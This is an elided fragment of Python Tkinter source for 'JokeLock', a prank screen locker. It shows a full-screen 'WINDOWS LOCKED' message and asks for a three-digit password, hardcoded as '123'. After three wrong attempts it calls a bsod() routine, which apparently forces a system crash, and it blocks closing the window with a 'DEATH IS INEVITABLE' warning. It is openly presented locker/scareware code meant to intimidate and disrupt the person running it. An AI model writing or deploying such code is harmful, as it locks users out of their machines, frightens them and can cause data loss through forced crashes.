...
password = "123"
lock_text = "Hello.I am Ruslan lets play with your brains password must be 3 numbers good luck :)"
count = 3
...
def check():
	...
	if enter_pass.get() == password:
		messagebox.showinfo("JokeLock","UNLOCKED SUCCESSFULLY")

		uninstall(wind)
	else:
		count -= 1
		if count == 0:
			messagebox.showwarning("JokeLock","number of attempts expired")
			bsod()
		else:
			
			messagebox.showwarning("JokeLock","Wrong password. Avalible tries: "+ str(count))


def exiting():
	messagebox.showwarning("JokeLock","DEATH IS INEVITABLE")
wind = Tk()
wind.title("JokeLock")
wind["bg"] = "black"
UNTEXD = Label(wind,bg="black", fg="red",text="WINDOWS LOCKED BY JokeLock\n\n\n", font="helvetica 75").pack()
